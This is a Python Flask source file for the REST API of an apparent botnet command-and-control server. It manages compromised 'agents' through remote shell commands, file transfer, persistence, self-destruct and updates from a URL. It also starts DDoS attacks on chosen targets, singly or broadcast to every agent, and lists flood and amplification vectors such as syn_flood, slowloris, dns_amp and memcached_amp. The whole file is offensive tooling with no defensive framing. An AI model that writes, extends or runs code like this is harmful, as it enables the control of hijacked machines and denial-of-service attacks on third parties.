#!/usr/bin/env python3
"""
REST API
JSON API endpoints for C2 management
"""

from flask import Blueprint, request, jsonify, Response
from typing import Optional
import json
import uuid
from datetime import datetime

api = Blueprint('api', __name__)


def APIBlueprint(c2_server=None):
    """Create API blueprint with C2 reference"""
    bp = Blueprint('api', __name__)
    bp._c2 = c2_server
    
    # ── Agents ──────────────────────────────────────────────
    
    @bp.route('/agents', methods=['GET'])
    def get_agents():
        if not bp._c2:
            return jsonify({'error': 'C2 not initialized'}), 503
        agents = bp._c2.get_agents()
        return jsonify({'agents': agents, 'count': len(agents)})
    
    @bp.route('/agents/<agent_id>', methods=['GET'])
    def get_agent(agent_id):
        if not bp._c2:
            return jsonify({'error': 'C2 not initialized'}), 503
        agent = bp._c2.get_agent(agent_id)
        if not agent:
            return jsonify({'error': 'Agent not found'}), 404
        return jsonify(agent.to_dict())
    
    @bp.route('/agents/<agent_id>/shell', methods=['POST'])
    def agent_shell(agent_id):
        if not bp._c2:
            return jsonify({'error': 'C2 not initialized'}), 503
        data = request.get_json()
        cmd = data.get('command', '')
        timeout = data.get('timeout', 30)
        
        if not cmd:
            return jsonify({'error': 'No command'}), 400
        
        success = bp._c2.shell_exec(agent_id, cmd, timeout)
        return jsonify({'success': success})
    
    @bp.route('/agents/<agent_id>/info', methods=['GET'])
    def agent_info(agent_id):
        if not bp._c2:
            return jsonify({'error': 'C2 not initialized'}), 503
        success = bp._c2.get_system_info(agent_id)
        return jsonify({'success': success})
    
    @bp.route('/agents/<agent_id>/download', methods=['POST'])
    def agent_download(agent_id):
        if not bp._c2:
            return jsonify({'error': 'C2 not initialized'}), 503
        data = request.get_json()
        path = data.get('path', '')
        success = bp._c2.download_from_agent(agent_id, path)
        return jsonify({'success': success})
    
    @bp.route('/agents/<agent_id>/upload', methods=['POST'])
    def agent_upload(agent_id):
        if not bp._c2:
            return jsonify({'error': 'C2 not initialized'}), 503
        path = request.form.get('path', '')
        file = request.files.get('file')
        if file and path:
            data = file.read()
            success = bp._c2.upload_to_agent(agent_id, path, data)
            return jsonify({'success': success})
        return jsonify({'error': 'No file or path'}), 400
    
    @bp.route('/agents/<agent_id>/persist', methods=['POST'])
    def agent_persist(agent_id):
        if not bp._c2:
            return jsonify({'error': 'C2 not initialized'}), 503
        data = request.get_json() or {}
        method = data.get('method', 'systemd')
        success = bp._c2.persist_agent(agent_id, method)
        return jsonify({'success': success})
    
    @bp.route('/agents/<agent_id>/cleanup', methods=['POST'])
    def agent_cleanup(agent_id):
        if not bp._c2:
            return jsonify({'error': 'C2 not initialized'}), 503
        success = bp._c2.cleanup_agent(agent_id)
        return jsonify({'success': success})
    
    @bp.route('/agents/<agent_id>/disconnect', methods=['POST'])
    def agent_disconnect(agent_id):
        if not bp._c2:
            return jsonify({'error': 'C2 not initialized'}), 503
        success = bp._c2.disconnect_agent(agent_id)
        return jsonify({'success': success})
    
    @bp.route('/agents/<agent_id>/update', methods=['POST'])
    def agent_update(agent_id):
        if not bp._c2:
            return jsonify({'error': 'C2 not initialized'}), 503
        data = request.get_json()
        url = data.get('url', '')
        success = bp._c2.update_agent(agent_id, url)
        return jsonify({'success': success})
    
    @bp.route('/agents/<agent_id>/destruct', methods=['POST'])
    def agent_destruct(agent_id):
        if not bp._c2:
            return jsonify({'error': 'C2 not initialized'}), 503
        data = request.get_json() or {}
        delay = data.get('delay', 0)
        success = bp._c2.self_destruct_agent(agent_id, delay)
        return jsonify({'success': success})
    
    @bp.route('/agents/<agent_id>/ping', methods=['POST'])
    def agent_ping(agent_id):
        if not bp._c2:
            return jsonify({'error': 'C2 not initialized'}), 503
        success = bp._c2.ping_agent(agent_id)
        return jsonify({'success': success})
    
    @bp.route('/agents/<agent_id>/tag', methods=['POST'])
    def agent_tag(agent_id):
        if not bp._c2:
            return jsonify({'error': 'C2 not initialized'}), 503
        data = request.get_json()
        tag = data.get('tag', '')
        agent = bp._c2.get_agent(agent_id)
        if agent and tag:
            if tag not in agent.tags:
                agent.tags.append(tag)
            return jsonify({'tags': agent.tags})
        return jsonify({'error': 'Agent not found'}), 404
    
    # ── Attacks ─────────────────────────────────────────────
    
    @bp.route('/attacks', methods=['GET'])
    def get_attacks():
        if not bp._c2:
            return jsonify({'error': 'C2 not initialized'}), 503
        jobs = bp._c2.get_jobs()
        return jsonify({'jobs': jobs, 'count': len(jobs)})
    
    @bp.route('/attacks/start', methods=['POST'])
    def start_attack():
        if not bp._c2:
            return jsonify({'error': 'C2 not initialized'}), 503
        data = request.get_json()
        
        agent_id = data.get('agent_id')
        vector = data.get('vector')
        target = data.get('target')
        port = data.get('port')
        duration = data.get('duration')
        threads = data.get('threads', 100)
        options = data.get('options', {})
        
        if not all([agent_id, vector, target, port, duration]):
            return jsonify({'error': 'Missing required fields'}), 400
        
        job_id = bp._c2.start_attack(
            agent_id=agent_id,
            vector=vector,
            target=target,
            port=int(port),
            duration=int(duration),
            threads=int(threads),
            **options
        )
        
        if job_id:
            return jsonify({'job_id': job_id, 'status': 'started'})
        return jsonify({'error': 'Failed to start attack'}), 500
    
    @bp.route('/attacks/<job_id>/stop', methods=['POST'])
    def stop_attack(job_id):
        if not bp._c2:
            return jsonify({'error': 'C2 not initialized'}), 503
        data = request.get_json() or {}
        agent_id = data.get('agent_id', '')
        success = bp._c2.stop_attack(agent_id, job_id)
        return jsonify({'success': success})
    
    @bp.route('/attacks/broadcast', methods=['POST'])
    def broadcast_attack():
        if not bp._c2:
            return jsonify({'error': 'C2 not initialized'}), 503
        data = request.get_json()
        
        vector = data.get('vector')
        target = data.get('target')
        port = data.get('port')
        duration = data.get('duration')
        threads = data.get('threads', 100)
        
        if not all([vector, target, port, duration]):
            return jsonify({'error': 'Missing required fields'}), 400
        
        from ironcarrier.c2.protocol import CommandBuilder
        msg = CommandBuilder.attack_start(
            vector=vector, target=target, port=int(port),
            duration=int(duration), threads=int(threads)
        )
        count = bp._c2.broadcast(msg)
        return jsonify({'sent_to': count})
    
    # ── Vectors ─────────────────────────────────────────────
    
    @bp.route('/vectors', methods=['GET'])
    def list_vectors():
        vectors = {
            'layer4': ['tcp_flood', 'udp_flood', 'syn_flood', 'ack_flood', 'udp_lag', 'blacknurse'],
            'layer7': ['http_flood', 'http_bypass', 'slowloris', 'slowpost', 'rage', 'hammer'],
            'amplification': ['dns_amp', 'ntp_amp', 'memcached_amp', 'ssdp_amp', 'cldap_amp', 'chargen_amp', 'misc_amp'],
        }
        return jsonify(vectors)
    
    # ── System ─────────────────────────────────────────────
    
    @bp.route('/system/status', methods=['GET'])
    def system_status():
        agents = bp._c2.get_agents() if bp._c2 else []
        jobs = bp._c2.get_jobs() if bp._c2 else []
        
        return jsonify({
            'c2_running': bp._c2 is not None,
            'agents_online': len(agents),
            'active_attacks': len([j for j in jobs if j['status'] == 'running']),
            'total_attacks': len(jobs),
            'timestamp': datetime.now().isoformat(),
        })
    
    return bp
